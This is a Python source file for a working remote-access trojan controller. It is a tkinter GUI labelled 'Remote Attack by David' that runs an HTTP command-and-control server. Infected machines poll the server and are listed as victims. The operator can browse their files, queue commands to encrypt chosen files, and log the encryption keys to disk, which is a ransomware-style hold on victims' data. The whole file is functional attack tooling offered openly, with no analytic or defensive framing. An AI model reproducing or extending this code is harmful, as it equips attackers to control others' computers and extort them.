import tkinter as tk
from tkinter import scrolledtext, messagebox, Listbox
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import time
import os

HOST = '0.0.0.0'
PORT = 8080

clients_data = {}
active_client_uuid = None
gui_root = None


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        self.send_response(200)
        self.end_headers()

        client_id = self.headers.get('X-UUID', 'Unknown')

        if client_id not in clients_data and client_id != 'Unknown':
            register_new_client(client_id, self.client_address[0])

        command = 'None'
        if client_id in clients_data and clients_data[client_id]['cmd_queue']:
            command = clients_data[client_id]['cmd_queue'].pop(0)

        self.wfile.write(command.encode())

    def do_POST(self):
        self.send_response(200)
        self.end_headers()

        try:
            client_id = self.headers.get('X-UUID', 'Unknown')
            length = int(self.headers['Content-Length'])
            result = self.rfile.read(length).decode()

            if client_id not in clients_data: return

            log_msg = ""

            if result.startswith("DIR_RESULT:"):
                parts = result.replace("DIR_RESULT:", "").split("||")
                current_path = parts[0]
                files_data = parts[1] if len(parts) > 1 else ""

                clients_data[client_id]['path'] = current_path
                clients_data[client_id]['files'] = files_data
                log_msg = f"[📂] Navigated to: {current_path}"

                if active_client_uuid == client_id:
                    update_ui_for_active_client()

            elif "ENCRYPTED_ONE:" in result:
                parts = result.split("||")
                info = parts[0].replace("ENCRYPTED_ONE:", "")
                fname, key = info.split("|")

                log_msg = f"⚠️ Encrypted: {fname}"
                save_key_to_disk(client_id, fname, key)

                if active_client_uuid == client_id:
                    update_key_entry(key)
                    cmd_refresh()

            elif "DECRYPTED_ONE:" in result:
                fname = result.split("||")[0].replace("DECRYPTED_ONE:", "")
                log_msg = f"[✅] File Restored: {fname}"
                if active_client_uuid == client_id:
                    cmd_refresh()

            elif "ERROR:" in result:
                log_msg = f"[!] {result}"

            else:
                log_msg = f"[i] {result}"

            if log_msg:
                timestamp = time.strftime("[%H:%M:%S] ")
                clients_data[client_id]['logs'] += timestamp + log_msg + "\n"
                if active_client_uuid == client_id:
                    update_log_display(timestamp + log_msg)

        except Exception as e:
            print(f"Server Error: {e}")


def register_new_client(uuid, ip):
    clients_data[uuid] = {
        'ip': ip,
        'path': 'Waiting...',
        'files': '',
        'logs': f"[*] New Victim Connected: {ip}\n",
        'cmd_queue': ['dir']
    }
    update_client_listbox()


def save_key_to_disk(client_id, filename, key):
    try:
        with open("decryption_keys.txt", "a", encoding="utf-8") as f:
            f.write(f"[{time.ctime()}] ID: {client_id[:8]} | File: {filename} | Key: {key}\n")
            f.write("-" * 50 + "\n")
    except Exception as e:
        print(f"Error saving key: {e}")


def run_server():
    try:
        server = HTTPServer((HOST, PORT), C2Handler)
        print(f"[*] Server Listening on {HOST}:{PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"[!] Server Start Error: {e}")


def update_client_listbox():
    if not gui_root: return
    listbox_clients.delete(0, tk.END)
    for uuid, data in clients_data.items():
        listbox_clients.insert(tk.END, f"{data['ip']} | {uuid[:6]}..")


def on_client_select(event):
    global active_client_uuid
    try:
        selection_index = listbox_clients.curselection()[0]
        all_uuids = list(clients_data.keys())
        active_client_uuid = all_uuids[selection_index]

        update_ui_for_active_client()
        lbl_current_victim.config(
            text=f"Connected: {clients_data[active_client_uuid]['ip']} (ID: {active_client_uuid[:6]})", fg="#00ff00")
    except:
        pass


def update_ui_for_active_client():
    if not active_client_uuid: return
    data = clients_data[active_client_uuid]

    lbl_path.config(text=f"Path: {data['path']}")

    listbox_files.delete(0, tk.END)
    files = data['files'].split(",")
    for f in files:
        if f.strip():
            listbox_files.insert(tk.END, f)
            if f.startswith("[DIR]"):
                listbox_files.itemconfig(tk.END, {'fg': '#ffff00'})
            elif f.endswith('.enc'):
                listbox_files.itemconfig(tk.END, {'bg': '#550000', 'fg': '#ff9999'})

    log_area.config(state=tk.NORMAL)
    log_area.delete(1.0, tk.END)
    log_area.insert(tk.END, data['logs'])
    log_area.see(tk.END)
    log_area.config(state=tk.DISABLED)


def update_log_display(msg):
    if gui_root:
        log_area.config(state=tk.NORMAL)
        log_area.insert(tk.END, msg + "\n")
        log_area.see(tk.END)
        log_area.config(state=tk.DISABLED)


def update_key_entry(key):
    if gui_root:
        entry_key.delete(0, tk.END)
        entry_key.insert(0, key)


def push_command(cmd):
    if active_client_uuid:
        clients_data[active_client_uuid]['cmd_queue'].append(cmd)
    else:
        messagebox.showwarning("!", "Select a victim first!")


def cmd_refresh(): push_command('dir')


def cmd_cd_up(): push_command('cd ..')


def on_file_double_click(event):
    try:
        selection = listbox_files.get(listbox_files.curselection())
        if selection.startswith("[DIR] "):
            folder = selection.replace("[DIR] ", "")
            push_command(f'cd {folder}')
    except:
        pass


def cmd_encrypt():
    try:
        selection = listbox_files.get(listbox_files.curselection())
        if not selection.startswith("[DIR]"):
            push_command(f'enc_file {selection}')
    except:
        pass


def cmd_decrypt():
    try:
        selection = listbox_files.get(listbox_files.curselection())
        key = entry_key.get().strip()
        if key: push_command(f'dec_file {selection}|{key}')
    except:
        pass


root = tk.Tk()
gui_root = root
root.title("RAT Killer_Encrepter")
root.geometry("1000x650")
root.configure(bg="#1e1e1e")

tk.Label(root, text="☠️Remote Attack by David☠️", font=("Impact", 16), bg="#1e1e1e", fg="#ff3333").pack(pady=5)

main_frame = tk.Frame(root, bg="#1e1e1e")
main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

left_panel = tk.LabelFrame(main_frame, text="Victims List", bg="#2b2b2b", fg="white", width=200)
left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=5)
left_panel.pack_propagate(False)

listbox_clients = Listbox(left_panel, bg="black", fg="#00ff00", font=("Consolas", 10))
listbox_clients.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
listbox_clients.bind('<<ListboxSelect>>', on_client_select)

right_panel = tk.Frame(main_frame, bg="#1e1e1e")
right_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

lbl_current_victim = tk.Label(right_panel, text="Waiting for selection...", bg="#333", fg="white",
                              font=("Arial", 10, "bold"))
lbl_current_victim.pack(fill=tk.X, pady=2)

nav_frame = tk.Frame(right_panel, bg="#333")
nav_frame.pack(fill=tk.X)
tk.Button(nav_frame, text="⬆️ UP", bg="#555", fg="white", command=cmd_cd_up).pack(side=tk.LEFT)
lbl_path = tk.Label(nav_frame, text="Path: ...", bg="#333", fg="yellow")
lbl_path.pack(side=tk.LEFT, padx=10)
tk.Button(nav_frame, text="REFRESH", bg="#0055ff", fg="white", command=cmd_refresh).pack(side=tk.RIGHT)

split_h = tk.PanedWindow(right_panel, orient=tk.VERTICAL, bg="#1e1e1e")
split_h.pack(fill=tk.BOTH, expand=True)

frame_files = tk.LabelFrame(split_h, text="File Manager", bg="#1e1e1e", fg="white")
listbox_files = Listbox(frame_files, bg="#252525", fg="white", selectbackground="#006600")
listbox_files.pack(fill=tk.BOTH, expand=True)
listbox_files.bind('<Double-Button-1>', on_file_double_click)
split_h.add(frame_files)

frame_logs = tk.LabelFrame(split_h, text="Activity Logs", bg="#1e1e1e", fg="white")
log_area = scrolledtext.ScrolledText(frame_logs, bg="black", fg="#00ff00", height=8)
log_area.pack(fill=tk.BOTH, expand=True)
split_h.add(frame_logs)

ctrl_frame = tk.Frame(right_panel, bg="#333")
ctrl_frame.pack(fill=tk.X, pady=5)
tk.Button(ctrl_frame, text="🔒 ENCRYPT", bg="red", fg="white", command=cmd_encrypt).pack(side=tk.LEFT, padx=5)
tk.Label(ctrl_frame, text="Key:", bg="#333", fg="white").pack(side=tk.LEFT)
entry_key = tk.Entry(ctrl_frame, width=35)
entry_key.pack(side=tk.LEFT)
tk.Button(ctrl_frame, text="🔓 DECRYPT", bg="green", fg="white", command=cmd_decrypt).pack(side=tk.LEFT, padx=5)

threading.Thread(target=run_server, daemon=True).start()
root.mainloop()